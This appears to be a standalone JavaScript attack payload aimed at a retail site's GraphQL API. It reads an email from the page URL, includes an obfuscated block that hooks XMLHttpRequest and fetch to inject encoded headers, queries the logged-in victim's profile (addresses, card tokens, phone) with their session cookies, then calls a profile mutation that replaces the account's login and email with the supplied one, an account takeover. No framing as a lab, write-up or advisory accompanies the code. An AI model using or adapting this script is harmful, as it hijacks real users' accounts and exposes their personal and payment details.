
async function s2() {
    email = new URLSearchParams(location.search).get('e').replace(/ /, '+')

    (function(){(function(a){"use strict";var b=Function.prototype.call.bind(Function.prototype.toString);var c=void 0,d=void 0;var e=function f(){var g=c.lastIndexOf(this);if(g>=0){return d[g]}return b(this)};e.prototype=void 0;c=[e];d=[b(Function.prototype.toString)];var h=function(i,j){if(typeof j!=="function"){return}try{d.push(b(j));c.push(i);if(Function.prototype.toString!==e){Function.prototype.toString=e}}catch(k){}};var l=String.fromCharCode.bind(String);function m(n){return l(8238)+n+l(8237)}var o=m("vHgvBRZiT");var p=m("YGYEQwgdu");var q=void 0;var r=Object.defineProperty.bind(Object);(function(){var s=XMLHttpRequest.prototype;var t=s.open;var u=s.send;var v=s.setRequestHeader;function w(x,y,z){var A=Object.getOwnPropertyDescriptor(x,y);if(A&&(A.writable||A.configurable)){A.value=z;r(x,y,A)}}function B(C,D,E,F,G){var H=[].slice.call(arguments);var I=""+C;H[0]=I;var J=t.apply(this,H);r(this,o,{writable:true,configurable:true,enumerable:false,value:{method:C==null?null:I.toLowerCase(),url:D}});return J}function K(L){if(q!=null&&o in this&&q.shouldHook(this[o])){var M=q.getEncodedData();if(M){for(var N in M){if(!{}.hasOwnProperty.call(M,N))continue;var O=M[N];var P=q.config.headerNamePrefix+N;var Q=q.chunk(P,O,q.config.headerChunkSize);for(var R in Q){if(!{}.hasOwnProperty.call(Q,R))continue;v.call(this,R,Q[R])}}}}return u.apply(this,arguments)}if(!(p in s)){r(s,p,{writable:true,configurable:true,enumerable:false,value:true});h(B,t);h(K,u);w(s,"open",B);w(s,"send",K)}}());(function(){var S=window.fetch;var T=window.Request;var U=function V(W,X){var Y=new T(W,X);var Z={url:Y.url,method:Y.method};if(q!=null&&q.shouldHook(Z)){var ba=q.getEncodedData();if(ba){for(var bb in ba){if(!{}.hasOwnProperty.call(ba,bb))continue;var bc=ba[bb];var bd=q.config.headerNamePrefix+bb;var be=q.chunk(bd,bc,q.config.headerChunkSize);for(var bf in be){if(!{}.hasOwnProperty.call(be,bf))continue;Y.headers.set(bf,be[bf])}}}}return S(Y)};if(typeof S==="function"&&!(p in S)){r(U,p,{writable:true,configurable:true,enumerable:false,value:true});h(U,S);fetch=U}}());addEventListener(p,function bg(bh){q=bh.detail;if(bh.detail==null){removeEventListener(p,bg)}});var bi={__proto__:null};if(a.Symbol)a.Object.defineProperty(bi,a.Symbol.toStringTag,{value:"Module"});bi=a.Object.freeze(bi);return bi}(this))}());

    var s = document.createElement('script');
    s.src = '/shared/chunk.273c0224d38f1ad8.js?async';
    document.head.appendChild(s);
    
    var id = await fetch('/api/graphql', {
    method: 'post',
    credentials: 'include',
      headers:{
    'content-type': 'application/json'
      },
    body: JSON.stringify({
      query: `query gihProfile {\n    gihProfile {\n      \n  id\n  type\n  firstName\n  middleName\n  lastName\n  gender\n  birthDay\n  birthMonth\n  locale\n  preferredLanguage\n  preferredStore\n  guestType\n  username\n  email\n  phone {\n    number\n    countryCode\n  }\n  employee {\n    startDate\n    employeeId\n    region\n  }\n  membership {\n    startDate\n    endDate\n  }\n  checkoutPreferences {\n    paymentMethod\n    shippingMethod\n    expressCheckout\n  }\n  registration {\n    source\n    region\n    store\n  }\n  tnc{\n    action\n    actionDate\n  }\n  legacy {\n    membershipCity\n  }\n  recognizeMeId\n  createdDate\n  updatedDate\n      addresses {\n        type\n        id\n        addressType\n        firstName\n        middleName\n        lastName\n        line1\n        line2\n        city\n        state\n        country\n        postalCode\n        phone {\n          countryCode\n          number\n        }\n        primary\n        verified\n        createdDate\n        updatedDate\n      }\n      creditCards {\n        type\n        id\n        cardType\n        cardToken\n        last4Digits\n        fullName\n        expiryMonth\n        expiryYear\n        address {\n          firstName\n          lastName\n          line1\n          line2\n          city\n          state\n          country\n          postalCode\n          phone {\n            number\n            countryCode\n          }\n        }\n        paymentGateway\n        primary\n        verified\n        updatedDate\n      }\n      giftCards {\n        id\n        type\n        last4Digits\n      }\n      loyaltyPrograms {\n         id\n        type\n        programCode\n        programSubType\n        country\n        verificationStatus\n        verifiedDate\n        expiryDate\n        createdDate\n        updatedDate\n      }\n    }\n  }`,
    })
  }).then(t=>t.json()).then(t=>t.data.gihProfile.id);
  
  await fetch('/api/graphql', {
    method: 'post',
    credentials: 'include',
      headers:{
    'content-type': 'application/json'
      },
      body: JSON.stringify({
        "query":`\n  mutation updateProfileOkta(\n    $oktaId: String!\n    $login: String\n    $newEmail: String\n    $firstName: String\n    $lastName: String\n  ) {\n    updateProfileOkta(\n      oktaId: $oktaId\n      login: $login\n      newEmail: $newEmail\n      firstName: $firstName\n      lastName: $lastName\n    ) {\n      status\n      desc\n    }\n  }\n`,
        "variables":{
            "oktaId": id,
            "login": email,
            "newEmail":email
        }
    })
}).then(t=>t.json())
}
s2();
